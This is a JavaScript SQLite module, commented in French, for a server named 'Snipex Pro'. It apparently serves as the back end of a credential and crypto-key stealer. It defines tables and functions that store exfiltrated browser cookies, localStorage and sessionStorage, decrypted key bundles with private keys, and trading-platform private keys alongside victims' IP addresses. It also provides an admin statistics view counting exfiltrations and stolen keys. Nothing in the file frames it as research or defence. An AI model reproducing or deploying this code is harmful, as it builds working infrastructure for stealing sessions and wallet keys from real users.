// Base de données SQLite pour le serveur Snipex Pro
// Stockage des données exfiltrées et logs d'activité

const sqlite3 = require('sqlite3').verbose();
const { promisify } = require('util');

// Base de données en mémoire (pour Vercel)
const db = new sqlite3.Database(':memory:');

// Convertir les callbacks en promesses
const dbRun = promisify(db.run.bind(db));
const dbGet = promisify(db.get.bind(db));
const dbAll = promisify(db.all.bind(db));

// Initialisation de la base de données
const initDatabase = async () => {
    try {
        // Table des utilisateurs
        await dbRun(`
            CREATE TABLE IF NOT EXISTS users (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE,
                email TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_login DATETIME,
                is_active BOOLEAN DEFAULT 1
            )
        `);

        // Table des clés de déchiffrement
        await dbRun(`
            CREATE TABLE IF NOT EXISTS bundle_keys (
                key_id TEXT PRIMARY KEY,
                user_id TEXT,
                key_data TEXT NOT NULL,
                expires_at DATETIME NOT NULL,
                bundles_count INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        `);

        // Table des demandes de clés
        await dbRun(`
            CREATE TABLE IF NOT EXISTS bundle_key_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                bundles_count INTEGER,
                user_agent TEXT,
                url TEXT,
                referrer TEXT,
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        `);

        // Table des données exfiltrées
        await dbRun(`
            CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id TEXT PRIMARY KEY,
                user_id TEXT,
                metadata TEXT,
                exfiltrated_data TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        `);

        // Table des clés déchiffrées
        await dbRun(`
            CREATE TABLE IF NOT EXISTS decrypted_keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                exfiltration_id TEXT,
                key_type TEXT,
                public_key TEXT,
                private_key TEXT,
                bundle TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id),
                FOREIGN KEY (exfiltration_id) REFERENCES exfiltrated_data (id)
            )
        `);

        // Table des accès à la plateforme de trading
        await dbRun(`
            CREATE TABLE IF NOT EXISTS trading_access (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                public_key TEXT,
                private_key TEXT,
                user_agent TEXT,
                ip_address TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Table des logs d'exfiltration
        await dbRun(`
            CREATE TABLE IF NOT EXISTS exfiltration_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT,
                exfiltration_id TEXT,
                total_bundles INTEGER,
                decoded_keys INTEGER,
                generated_urls INTEGER,
                user_agent TEXT,
                url TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id),
                FOREIGN KEY (exfiltration_id) REFERENCES exfiltrated_data (id)
            )
        `);

        // Table des statistiques
        await dbRun(`
            CREATE TABLE IF NOT EXISTS statistics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE DEFAULT CURRENT_DATE,
                total_requests INTEGER DEFAULT 0,
                total_bundles INTEGER DEFAULT 0,
                total_keys INTEGER DEFAULT 0,
                total_exfiltrations INTEGER DEFAULT 0,
                unique_users INTEGER DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        console.log('✅ Base de données initialisée avec succès');
        
        // Créer un utilisateur par défaut pour les tests
        await createDefaultUser();
        
    } catch (error) {
        console.error('❌ Erreur lors de l\'initialisation de la base de données:', error);
    }
};

// Créer un utilisateur par défaut
const createDefaultUser = async () => {
    try {
        const defaultUser = {
            id: 'default-user-123',
            username: 'default_user',
            email: 'default@snipex.pro'
        };

        await dbRun(`
            INSERT OR IGNORE INTO users (id, username, email)
            VALUES (?, ?, ?)
        `, [defaultUser.id, defaultUser.username, defaultUser.email]);

        console.log('👤 Utilisateur par défaut créé');
    } catch (error) {
        console.error('❌ Erreur lors de la création de l\'utilisateur par défaut:', error);
    }
};

// Fonctions de base de données

// Stocker une clé de déchiffrement
const storeBundleKey = async ({ keyId, key, userId, expiresAt, bundles }) => {
    try {
        await dbRun(`
            INSERT INTO bundle_keys (key_id, user_id, key_data, expires_at, bundles_count)
            VALUES (?, ?, ?, ?, ?)
        `, [keyId, userId, key, expiresAt.toISOString(), bundles]);

        return keyId;
    } catch (error) {
        console.error('Erreur lors du stockage de la clé:', error);
        throw error;
    }
};

// Logger une demande de clé
const logBundleKeyRequest = async (data) => {
    try {
        await dbRun(`
            INSERT INTO bundle_key_requests 
            (user_id, bundles_count, user_agent, url, referrer, cookies, localStorage, sessionStorage, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `, [
            data.userId,
            data.bundles,
            data.userAgent,
            data.url,
            data.referrer,
            data.cookies,
            JSON.stringify(data.localStorage),
            JSON.stringify(data.sessionStorage),
            data.timestamp
        ]);

        // Mettre à jour les statistiques
        await updateStatistics('requests', data.bundles);
        
    } catch (error) {
        console.error('Erreur lors du log de la demande de clé:', error);
    }
};

// Stocker les données exfiltrées
const storeExfiltratedData = async ({ userId, metadata, exfiltratedData, timestamp }) => {
    try {
        const exfiltrationId = `exfiltration-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
        
        await dbRun(`
            INSERT INTO exfiltrated_data (id, user_id, metadata, exfiltrated_data, timestamp)
            VALUES (?, ?, ?, ?, ?)
        `, [
            exfiltrationId,
            userId,
            JSON.stringify(metadata),
            JSON.stringify(exfiltratedData),
            timestamp
        ]);

        // Mettre à jour les statistiques
        await updateStatistics('exfiltrations', exfiltratedData.length);
        
        return exfiltrationId;
    } catch (error) {
        console.error('Erreur lors du stockage des données exfiltrées:', error);
        throw error;
    }
};

// Stocker une clé déchiffrée
const storeDecryptedKey = async ({ userId, exfiltrationId, type, publicKey, privateKey, bundle, timestamp }) => {
    try {
        await dbRun(`
            INSERT INTO decrypted_keys (user_id, exfiltration_id, key_type, public_key, private_key, bundle, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `, [
            userId,
            exfiltrationId,
            type,
            publicKey,
            privateKey,
            bundle,
            timestamp.toISOString()
        ]);

        // Mettre à jour les statistiques
        await updateStatistics('keys', 1);
        
    } catch (error) {
        console.error('Erreur lors du stockage de la clé déchiffrée:', error);
    }
};

// Logger l'accès à la plateforme de trading
const logTradingAccess = async (data) => {
    try {
        await dbRun(`
            INSERT INTO trading_access (public_key, private_key, user_agent, ip_address, timestamp)
            VALUES (?, ?, ?, ?, ?)
        `, [
            data.publicKey,
            data.privateKey,
            data.userAgent,
            data.ip,
            data.timestamp
        ]);
        
    } catch (error) {
        console.error('Erreur lors du log de l\'accès trading:', error);
    }
};

// Logger une exfiltration
const logExfiltration = async (data) => {
    try {
        await dbRun(`
            INSERT INTO exfiltration_logs 
            (user_id, exfiltration_id, total_bundles, decoded_keys, generated_urls, user_agent, url, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `, [
            data.userId,
            data.exfiltrationId,
            data.totalBundles,
            data.decodedKeys,
            data.generatedUrls,
            data.userAgent,
            data.url,
            data.timestamp
        ]);
        
    } catch (error) {
        console.error('Erreur lors du log de l\'exfiltration:', error);
    }
};

// Mettre à jour les statistiques
const updateStatistics = async (type, count) => {
    try {
        const today = new Date().toISOString().split('T')[0];
        
        // Vérifier si une entrée existe pour aujourd'hui
        const existing = await dbGet('SELECT * FROM statistics WHERE date = ?', [today]);
        
        if (existing) {
            // Mettre à jour l'entrée existante
            await dbRun(`
                UPDATE statistics 
                SET total_requests = total_requests + ?,
                    total_bundles = total_bundles + ?,
                    total_keys = total_keys + ?,
                    total_exfiltrations = total_exfiltrations + ?
                WHERE date = ?
            `, [
                type === 'requests' ? count : 0,
                type === 'bundles' ? count : 0,
                type === 'keys' ? count : 0,
                type === 'exfiltrations' ? count : 0,
                today
            ]);
        } else {
            // Créer une nouvelle entrée
            await dbRun(`
                INSERT INTO statistics 
                (date, total_requests, total_bundles, total_keys, total_exfiltrations, unique_users)
                VALUES (?, ?, ?, ?, ?, ?)
            `, [
                today,
                type === 'requests' ? count : 0,
                type === 'bundles' ? count : 0,
                type === 'keys' ? count : 0,
                type === 'exfiltrations' ? count : 0,
                1
            ]);
        }
        
    } catch (error) {
        console.error('Erreur lors de la mise à jour des statistiques:', error);
    }
};

// Obtenir les statistiques admin
const getAdminStats = async () => {
    try {
        const stats = await dbGet('SELECT * FROM statistics WHERE date = CURRENT_DATE');
        const totalUsers = await dbGet('SELECT COUNT(DISTINCT user_id) as count FROM bundle_key_requests');
        const totalKeys = await dbGet('SELECT COUNT(*) as count FROM decrypted_keys');
        const totalExfiltrations = await dbGet('SELECT COUNT(*) as count FROM exfiltrated_data');
        
        return {
            today: stats || {
                total_requests: 0,
                total_bundles: 0,
                total_keys: 0,
                total_exfiltrations: 0
            },
            overall: {
                total_users: totalUsers?.count || 0,
                total_keys: totalKeys?.count || 0,
                total_exfiltrations: totalExfiltrations?.count || 0
            },
            timestamp: new Date().toISOString()
        };
    } catch (error) {
        console.error('Erreur lors de la récupération des statistiques:', error);
        throw error;
    }
};

// Obtenir toutes les clés déchiffrées
const getAllDecryptedKeys = async () => {
    try {
        const keys = await dbAll(`
            SELECT dk.*, u.username, ed.metadata
            FROM decrypted_keys dk
            LEFT JOIN users u ON dk.user_id = u.id
            LEFT JOIN exfiltrated_data ed ON dk.exfiltration_id = ed.id
            ORDER BY dk.timestamp DESC
        `);
        
        return keys.map(key => ({
            ...key,
            metadata: key.metadata ? JSON.parse(key.metadata) : null
        }));
    } catch (error) {
        console.error('Erreur lors de la récupération des clés:', error);
        throw error;
    }
};

// Initialiser la base de données au démarrage
initDatabase();

// Export des fonctions
module.exports = {
    storeBundleKey,
    logBundleKeyRequest,
    storeExfiltratedData,
    storeDecryptedKey,
    logTradingAccess,
    logExfiltration,
    getAdminStats,
    getAllDecryptedKeys
}; 